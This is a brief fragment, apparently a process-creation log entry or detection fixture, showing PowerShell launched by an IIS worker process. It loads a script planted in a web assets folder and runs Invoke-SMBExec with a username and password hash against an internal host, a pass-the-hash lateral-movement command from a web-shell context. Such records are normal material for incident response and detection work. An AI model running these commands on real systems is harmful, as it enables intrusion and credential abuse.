      command_line: 'powershell -Command ". ''C:\inetpub\wwwroot\portal\assets\Invoke-HostQuery.ps1''; Invoke-SMBExec -Target 10.42.10.10 -Domain meridianfreight -Username dmontoya -Hash 3ba61d9c7f04e28a5c6d13804f9ae7b2 -Command ''dir C:\''"'
      parent_name: w3wp.exe
